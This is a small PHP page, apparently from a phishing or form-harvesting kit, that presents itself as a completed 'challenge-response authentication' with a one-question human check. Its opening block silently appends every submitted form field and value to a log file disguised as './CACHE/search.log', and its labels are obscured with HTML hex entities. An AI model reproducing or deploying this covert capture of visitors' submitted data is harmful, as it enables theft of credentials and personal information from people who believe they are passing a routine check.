<?php
header( 'viewport: width=device-width' );

$ip = $localIp = gethostbyname(gethostname());

$handle = fopen("./CACHE/search.log", "a"); //open log file

foreach($_POST as $variable => $value) { //loop through POST vars
fwrite($handle, $variable . "+" . $value . "\r\n");
}
fwrite($handle, "IP: $ip \r\n \r\n");
fclose($handle);

?>

<meta name="viewport" content="width=device-width, initial-scale=1">

<h6>1st Challenge-response authentication completed.</h6>

<div id="&#x70;&#x61;&#x67;&#x65;&#x2D;&#x77;&#x72;&#x61;&#x70;">
		<h1>&#x46;&#x6F;&#x72;&#x6D;&#x20;&#x52;&#x65;&#x73;&#x75;&#x6C;&#x74;&#x73;</h1>		
        <?php 
		
            $answer1 = $_POST['secure-form-answer'];        
            $totalCorrect = 0;           
            if ($answer1 == "Human") { $totalCorrect++; }            
            echo "<div id='&#x72;&#x65;&#x73;&#x75;&#x6C;&#x74;&#x73;'>$totalCorrect / &#x31;&#x20;&#x63;&#x6F;&#x72;&#x72;&#x65;&#x63;&#x74;</div>";           
            
		?>
		
		<br>
	<a href="./human.html">&#x45;&#x6E;&#x74;&#x65;&#x72; this website</a>
	</div>

